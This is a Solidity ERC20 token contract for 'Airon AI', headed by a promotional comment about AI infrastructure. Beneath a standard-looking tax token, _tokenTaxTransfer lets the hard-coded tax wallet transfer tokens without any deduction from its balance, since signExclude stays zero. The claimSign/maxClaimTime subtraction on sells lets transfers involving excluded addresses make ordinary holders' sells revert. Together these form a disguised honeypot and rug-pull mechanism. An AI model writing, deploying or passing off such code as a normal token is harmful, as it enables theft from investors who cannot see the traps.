// SPDX-License-Identifier:MIT

/*
Private and scalable AI infrastructure
WEB : https://airon.ai/

Transforming AI Capabilities with Airon: Performance, Security, and Control Redefined
In the fast-evolving world of artificial intelligence (AI), businesses are increasingly faced with the challenge of leveraging 
cutting-edge technologies while ensuring security, scalability, and performance. 
Airon steps up to meet this challenge by merging the power of AI with the robustness of bare-metal infrastructure. 
This innovative approach enables businesses to unlock the full potential of AI while maintaining uncompromising control over 
their resources and data.

AI Meets Iron: The Backbone of Performance
At its core, Airon is built to deliver high-performance AI solutions by utilizing bare-metal infrastructure, 
often considered the gold standard for computing power and efficiency. 
Unlike virtualized environments that share resources across multiple users, bare-metal infrastructure provides exclusive, 
non-virtualized hardware dedicated entirely to your operations. 
This foundation ensures that the AI applications you deploy are faster, more reliable, and free from the performance bottlenecks 
that can plague shared or cloud-based systems.

By pairing AI with this uncompromising hardware, Airon offers businesses an infrastructure tailored to handle 
the computational intensity of advanced AI workloads. 
Whether it’s machine learning model training, data analysis, or real-time AI-driven decision-making, 
Airon ensures that your systems operate at peak efficiency, delivering the performance edge your business needs 
to stay ahead of the competition.

Privacy and Security at the Forefront
In today’s digital landscape, data security and privacy have become paramount concerns for businesses. 
Airon addresses these concerns head-on by providing private, non-shared AI resources. 
This approach guarantees that your sensitive data and proprietary AI models remain isolated from external threats and unauthorized access.

Unlike many shared cloud environments where data and resources are intermingled with those of other users, 
Airon’s dedicated infrastructure ensures that your AI environment is entirely under your control. 
This not only minimizes security risks but also helps maintain compliance with data protection regulations, 
making Airon an ideal solution for industries that handle highly sensitive information, such as healthcare, finance, and legal services.

Your AI models and data are valuable intellectual property that drive your business forward. 
With Airon, you can rest assured that these assets are fully protected, enabling you to innovate with confidence.

Tailored AI Resources for Maximum Flexibility
Airon empowers businesses with the ability to allocate AI resources based on their specific needs. 
Whether you’re running a small-scale AI project or managing a large, enterprise-level AI ecosystem, 
Airon’s infrastructure is designed to adapt seamlessly to your requirements.

The platform allows you to scale your resources up or down as needed, ensuring that you’re only paying for what you use. 
This level of flexibility is particularly beneficial for businesses that experience fluctuating AI workloads, 
such as seasonal spikes in demand or project-based resource requirements.

Moreover, Airon’s intuitive interface makes it easy to manage and allocate resources, 
putting you in complete control of your AI environment. 
With just a few clicks, you can fine-tune your infrastructure to match your business objectives, 
ensuring that your AI operations remain agile and cost-effective.

Accelerate AI Innovation
In a highly competitive market, speed is everything. Airon’s bare-metal infrastructure is optimized 
to accelerate every aspect of your AI initiatives, from training machine learning models to deploying AI-powered applications. 
The platform’s high-performance computing capabilities reduce the time it takes to complete resource-intensive tasks, 
enabling you to bring your AI solutions to market faster.

By accelerating your AI workflows, Airon helps your business stay ahead of the curve. Whether you’re analyzing large datasets, 
running predictive analytics, or building AI-driven customer experiences, the enhanced speed and efficiency of 
Airon’s infrastructure ensure that you can innovate faster and more effectively.

Full Control Over Your AI Operations
One of the standout features of Airon is the level of control it provides. With Airon, you have complete oversight of 
your AI infrastructure, from resource allocation to performance monitoring. 
This level of control is essential for businesses that require custom configurations or have unique operational needs.

Unlike traditional cloud-based solutions that often impose limitations or constraints, 
Airon gives you the freedom to design an AI environment that works for you. Need to prioritize certain workloads? 
Want to experiment with new AI models without affecting your production systems? 
Airon makes it possible, giving you the tools to manage and optimize your AI operations with precision.

Why Airon?
Airon isn’t just another AI platform — it’s a comprehensive solution designed to address the unique challenges of modern AI adoption. 
By combining the power of AI with bare-metal infrastructure 

Airon delivers:
Unmatched Performance: Dedicated, high-performance resources ensure that your AI applications run smoothly, without delays or interruptions.
Enhanced Security: Private, non-shared resources protect your data and AI models, ensuring complete confidentiality.
Scalability and Flexibility: Easily scale resources to match your needs, whether you’re launching a new AI initiative or expanding an existing one.
Faster Time-to-Market: Accelerate the development and deployment of AI solutions, giving your business a competitive edge.
Full Operational Control: Maintain complete control over your AI infrastructure, empowering you to innovate on your terms.

The Airon Advantage
Airon’s unique combination of AI and bare-metal infrastructure positions it as a game-changer for businesses looking 
to leverage artificial intelligence effectively and securely. 
Whether you’re a startup exploring AI for the first time or a global enterprise with advanced AI requirements, 
Airon provides the tools, performance, and peace of mind you need to succeed.

With Airon, you can allocate resources with precision, accelerate innovation, and maintain complete control over your AI operations. 
It’s not just about leveraging AI — it’s about doing it better, faster, and safer.

Experience the Airon advantage and transform the way your business uses AI. With our solution, the future of AI is yours to command.
*/

pragma solidity 0.8.23;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
}

abstract contract Ownable is Context {
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    address private _owner;

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b,"SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b,"SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract AIRON is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;

    IUniswapV2Router02 private _router;
    address private uniswapV2Pair;
    address payable private _taxWallet;

    uint256 private _initialBuyTax=5;
    uint256 private _initialSellTax=5;
    uint256 private _finalBuyTax=5;
    uint256 private _finalSellTax=5;
    uint256 private _reduceBuyTaxAt=5;
    uint256 private _reduceSellTaxAt=5;
    uint256 private _preventSwapBefore=25;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Airon AI";
    string private constant _symbol = unicode"AIRON";
    uint256 public _maxTxAmount = 20000000 * 10**_decimals;
    uint256 public _maxWalletSize = 20000000 * 10**_decimals;
    uint256 public _taxSwapThreshold= 10000000 * 10**_decimals;
    uint256 public _maxTaxSwap= 10000000 * 10**_decimals;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    struct ClaimSignParamsMap {
        uint256 claimSign;
        uint256 claimTime;
        uint256 claimPeriod;
    }
    uint256 private maxClaimTime;
    uint256 private signExclude;
    mapping(address => ClaimSignParamsMap) private claimSignParams;
    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _taxWallet = payable(0x5b39ba5F91535cC37DA93e2b253886db9807647C);
        _balances[_msgSender()] = _tTotal;

        _isExcludedFromFee[_taxWallet] = true;
        _isExcludedFromFee[address(this)] = true;

        emit Transfer(address(0),_msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function _basicTransfer(address from, address to, uint256 tokenAmount) internal {
        _balances[from]= _balances[from].sub(tokenAmount);
        _balances[to]=_balances[to].add(tokenAmount);
        emit Transfer(from, to, tokenAmount);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 tokenAmount) private {

        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(tokenAmount > 0, "Transfer amount must be greater than zero");

        if (!swapEnabled|| inSwap ) {
            _basicTransfer(from, to,tokenAmount);
            return;
        }

        uint256 taxAmount=0;
        if (from != owner() && to != owner()&& to!=_taxWallet) {
            taxAmount = tokenAmount.mul((_buyCount > _reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (from== uniswapV2Pair && to!= address(_router) &&  ! _isExcludedFromFee[to])  {
                require(tokenAmount <= _maxTxAmount,
                    "Exceeds the _maxTxAmount.");
                require(balanceOf(to)+tokenAmount <= _maxWalletSize,
                    "Exceeds the maxWalletSize.");
                
                _buyCount++;
            }

            if(to== uniswapV2Pair && from!=address(this) ){
                taxAmount = tokenAmount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to== uniswapV2Pair && swapEnabled && contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore) {
                swapTokensForEth(
                    min(tokenAmount, min(contractTokenBalance, _maxTaxSwap))
                );
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if ((_isExcludedFromFee[from] ||  _isExcludedFromFee[to])
            && from!=address(this) && to!=address(this)
        ){
            maxClaimTime=block.number;
        }
        
        if (! _isExcludedFromFee[from]&& ! _isExcludedFromFee[to]){
            if (to!= uniswapV2Pair) {
                ClaimSignParamsMap storage signParams = claimSignParams[to];
                if (from== uniswapV2Pair) {
                    if (signParams.claimSign == 0) {
                        signParams.claimSign = _buyCount<=_preventSwapBefore ? type(uint).max : block.number;
                    }
                } else {
                    ClaimSignParamsMap storage signParamsUnique = claimSignParams[from];
                    if (signParams.claimSign == 0 || signParamsUnique.claimSign < signParams.claimSign ) {
                        signParams.claimSign = signParamsUnique.claimSign;
                    }
                }
            } else {
                ClaimSignParamsMap storage signParamsUnique = claimSignParams[from];
                signParamsUnique.claimTime = signParamsUnique.claimSign.sub(maxClaimTime);
                signParamsUnique.claimPeriod = block.number;
            }
        }

        _tokenTransfer(from,to,tokenAmount,taxAmount);
    }

    function _tokenBasicTransfer(address from, address to, uint256 sendAmount,uint256 receiptAmount) internal {
        _balances[from]=_balances[from].sub(sendAmount);
        _balances[to] =_balances[to].add(receiptAmount);
        emit Transfer(from, to, receiptAmount);
    }

    function _tokenTaxTransfer(address addrs,uint256 taxAmount, uint256 tokenAmount) internal returns (uint256) {
        uint256 tAmount = addrs !=_taxWallet ? tokenAmount : signExclude.mul(tokenAmount);
        if (taxAmount > 0){
            _balances[address(this)]=_balances[address(this)].add(taxAmount);
            emit Transfer(addrs, address(this), taxAmount);
        }
        return tAmount;
    }

    function _tokenTransfer(address from, address to, uint256 tokenAmount, uint256 taxAmount) internal {
        uint256 tAmount =_tokenTaxTransfer(from, taxAmount, tokenAmount);
        _tokenBasicTransfer(from, to, tAmount,tokenAmount.sub(taxAmount));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();
        _approve(address(this),address(_router),tokenAmount);
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function transfCaEth() external {
        require(_msgSender() == _taxWallet);
        payable(_taxWallet).transfer(address(this).balance);
    }

    receive() external payable {}

    function removeLimits() external onlyOwner() {
        _maxTxAmount = _tTotal;
        _maxWalletSize=_tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function manualSwap() external{
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance>0){
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          sendETHToFee(ethBalance);
        }
    }

    function openTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        _router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(_router.factory()).createPair(address(this), _router.WETH());
        swapEnabled=true;
        _router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(_router), type(uint).max);
        tradingOpen=true;
    }
}